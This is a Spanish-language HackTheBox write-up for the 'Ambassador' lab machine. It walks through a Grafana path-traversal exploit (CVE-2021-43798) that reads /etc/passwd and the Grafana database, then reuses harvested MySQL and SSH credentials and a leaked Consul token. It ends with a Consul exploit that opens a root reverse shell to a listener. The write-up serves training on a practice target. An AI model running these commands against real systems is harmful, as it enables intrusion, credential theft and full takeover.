---
title: Ambassador WriteUp
author: H4ckerLite 
date: 2023-01-17 00:00:00 +0800
categories: [hackthebox, machine, writeup]
tags: [hackthebox, writeup, grafana, directoty transversal, arbitrary file read]
pin: false
image:
  path: ../../assets/img/commons/ambassador-writeup/Ambassador.png 
  width: 800
  height: 500
  alt: Ambassador WriteUp
---

Les explicare como comprometer la máquina [Ambassador](https://app.hackthebox.com/machines/499) de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un
a vulnerabilidad de tipo `Directory Transversal` y `Arbitrary File Read`. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de `Consul` con un token que nos lanzará la s
hell como root.


## Escaneo NMAP

Empezamos enumerando con `NMAP`, con ello encontaremos los puertos abiertos y los servicios que se exponen.
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04
Initiating SYN Stealth Scan at 00:03
Scanning 10.10.11.183 [65535 ports]
Discovered open port 80/tcp on 10.10.11.183
Discovered open port 3306/tcp on 10.10.11.183
Discovered open port 22/tcp on 10.10.11.183
Discovered open port 3000/tcp on 10.10.11.183
Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports)
Nmap scan report for 10.10.11.183
Host is up, received user-set (0.32s latency).
Scanned at 2023-01-21 00:03:39 -04 for 17s
Not shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
           Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB)
```

Puerto **22** su servicio por defecto es **SSH**, **80** este puerto en su configuración por defecto corre el servicio **HTTP**, MySQL corre en el puerto **3306** y el puerto 
3000 fue asignado por el **administrador**
## Enumeración
Podemos realizar **FUZZING** para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encon
tramos y tratar de acceder a él.
Viendo la web nos encontramos con esto:



Viendo en la parte inferior nos da información acerca de la versión, usando **searchsploit** nos damos cuenta de q
ue cuenta con estas vulnerabilidades ***Directory Traversal*** and ***Arbitrary File Read***


Podemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el `/etc/passwd`
```bash
❯ searchsploit -m multiple/webapps/50581.py
  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50581
     Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py
    Codes: CVE-2021-43798
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.py
```
Lo ejecutamos...



Buscando en internet acerca de este **CVE** nos encontramos con este [blog](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/), nos
 enseñan a explotarlo de forma manual.
 ```bash
❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$

root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
 ```

 Si seguimos leyendo podemos ver que nos podemos descargar la base de datos

 ```bash
 curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
 ```
 Ahora procedemos a leer la base de datos, para ello debes tener instalado **sqlite3** para verlo desde consola, ya que lo considero mas fácil.

 ```bash
  sudo apt install sqlite3
 ```
Sigueindo las instrucciones del blog leemos la base de datos.


 ```bash
 sqlite3 grafana.bd
 ```

 Una vez detro de la base de datos, procedemos a leer las tablas

 ```bash
 ❯ sqlite3 grafana.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> 

 ```

Usando una query de SQL, leeremos las columnas de la tabla **data_source**.


```bash
select * from data_source;

```
Veremos algo cómo esto.

```bash
sqlite> SELECT * FROM data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4z
sqlite> 
```

## Ganamos acceso
Donde el parámetro -h corresponde al host -u  al user -p a la contraseña
Ahora nos podemos conectar a **MySQL** debido a que conocemos el user y su contraseña.
```bash
❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 47
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0,172 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0,396 sec)

MySQL [whackywidget]> SELECT * FROM users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0,375 sec)

MySQL [whackywidget]> 

```

Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera.


```bash
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d;echo 
anEnglishManInNewYork027468
```

Con esas credenciales podemos conectarnos por **SSH**.


```bash
❯ ssh developer@10.10.11.183
The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.183' (ECDSA) to the list of known hosts.
developer@10.10.11.183's password: anEnglishManInNewYork027468 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 21 Jan 2023 05:10:23 AM UTC

  System load:  0.0               Processes:             229
  Usage of /:   84.4% of 5.07GB   Users logged in:       0
  Memory usage: 49%               IPv4 address for eth0: 10.10.11.183
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jan 21 00:27:29 2023 from 10.10.14.105
developer@ambassador:~$ export TERM=xterm
developer@ambassador:~$ 
```
Podemos leer la primara flag.
```
developer@ambassador:~$ cat user.txt 
565**************************1b5
developer@ambassador:~$ 
```
## Enumeración del sistema
En la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github.

```bash
developer@ambassador:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache
.gitconfig  .gnupg  .lesshst  .local  .profile  .ssh  snap  user.txt
developer@ambassador:~$ 
```
Si lo leemos nos dice la ruta donde se encuentra.

```bash
developer@ambassador:~$ cat .gitconfig 
[user]
    name = Developer
    email = developer@ambassador.local
[safe]
    directory = /opt/my-app
developer@ambassador:~$ 
```
Si nos situamos en la carpeta `/opt` podemos ver el proyecto github.

```bash
developer@ambassador:/opt/my-app$ ls -a
.  ..  .git  .gitignore  env  whackywidget
developer@ambassador:/opt/my-app$ 
```

Si hacemos un `git -log` podemos ver los últimos commits que se aplicaron

```bash
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app$ 

```
Ahora haciendo un `git show` se nos mostrará información acerca de ese commit.


```

developer@ambassador:/opt/my-app$ git show
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
developer@ambassador:/opt/my-app$ 
```
Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios.

## Escalada de privilegios

Usando el exploit  podemos elevar nuestros privilegios, nos descargamos el repositorio de **GitHub
**
, nos montamos un servidor **HTTP** con **Python** 


```bash
python -m http.server 80
```

En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.
```bash
developer@ambassador:~$ wget http://10.10.14.61/exploit.py
--2023-01-21 05:40:22--  http://10.10.14.61/exploit.py
Connecting to 10.10.14.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1409 (1.4K) [text/x-python]
Saving to: ‘exploit.py.1’

exploit.py.1                                  100%[=================================================================================================>]   1.38K  --.-KB/s    in 
0s      

2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409]

developer@ambassador:~$ 
```
En la máquina víctima ejecutamos lo siguiente.
Nota: Recuerda cambiar tu IP de HTB
En nuestra máquina host nos ponemos en escucha

```
developer@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 
```

```bash
❯ nc -nlvp 123
listening on [any] 123 ...
```
Al ejecutarlo nos debe llegar la shell como root

```bash
❯ nc -nlvp 123
listening on [any] 123 ...
connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732
bash: cannot set terminal process group (3731): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# 
```

Ahora podemos vizualizar la flag como root


```bash
root@ambassador:~# ls
cleanup.sh  root.txt  snap
root@ambassador:~# cat root.txt 
5a4**************************4b1
root@ambassador:~# 
```
